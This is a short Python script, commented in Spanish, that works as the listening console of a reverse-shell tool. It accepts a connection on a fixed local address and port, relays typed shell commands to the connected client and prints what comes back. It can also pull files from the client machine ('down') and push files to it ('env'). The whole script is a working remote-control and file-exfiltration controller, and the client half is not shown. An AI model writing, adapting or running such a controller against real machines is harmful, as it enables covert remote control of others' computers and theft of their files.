import socket
import os

direccion = ('192.168.100.17', 2000)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
    servidor.bind(direccion)
    servidor.listen(2)
    print(f'Litening in {direccion}')
    cliente, adrr = servidor.accept()
    cmd = input('$: ')
    while cmd != 'exit':
        if cmd != '':
            cliente.send(cmd.encode())
            if cmd.find('down') == 0:
                nombre = cmd[cmd.rfind('/')+1:]
                with open(nombre,'wb') as file:
                    bloqueo = cliente.getblocking()
                    datos = ""
                    # La primera vez lo forzamos a esperar la llegada de datos
                    cliente.setblocking(True)
                    try:
                        while True:
                            datos = cliente.recv(4096)
                            file.write(datos)
                            # A partir de ahora si no hay datos que leer finalizamos el bucle
                            cliente.setblocking(False)
                    except socket.error:
                        cliente.setblocking(bloqueo)
                        print(f'Se descargo {nombre}')
            elif cmd.find('env ') == 0:
                path = cmd[cmd.find(' ')+1:]
                if os.path.isfile(path):
                    with open(path,'rb') as file:
                        nombre = path[path.find('/')+1:]
                        data = file.read()
                    cliente.send(nombre.encode())
                    cliente.sendall(data)
            else:
                resultado = cliente.recv(4096).decode()
                print(resultado)
        cmd = input('$: ')
